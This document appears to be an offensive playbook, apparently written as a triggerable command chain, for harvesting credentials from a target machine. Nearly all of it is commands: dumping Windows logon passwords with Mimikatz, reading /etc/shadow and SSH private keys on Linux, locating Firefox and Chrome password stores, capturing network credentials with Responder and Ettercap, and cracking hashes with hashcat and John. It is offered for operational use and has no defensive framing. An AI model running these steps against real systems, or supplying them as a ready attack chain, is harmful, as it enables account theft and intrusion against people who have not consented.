# Chain: Credential Harvest

## Trigger: go creds <target>
## Purpose: Gather credentials from target system

### Steps

1. **Local Passwords (Windows)**
```bash
# Mimikatz (if loaded)
mimikatz
privilege::debug
sekurlsa::logonpasswords
```

2. **Local Passwords (Linux)**
```bash
# Shadow file
cat /etc/shadow
# Passwd file
cat /etc/passwd
# SSH keys
find / -name "id_rsa" 2>/dev/null
```

3. **Browser Passwords**
```bash
# Firefox
ls ~/.mozilla/firefox/*/logins.json
# Chrome
ls ~/.config/google-chrome/Default/Login\ Data
```

4. **Network Credentials**
```bash
# Responder
responder -I eth0
# Ettercap
ettercap -G
```

5. **Hash Cracking**
```bash
# Hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
# John
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Tools Used
- Mimikatz
- Responder
- Hashcat
- John
- LaZagne

### Output
- passwords.txt
- hashes.txt
- cracked.txt
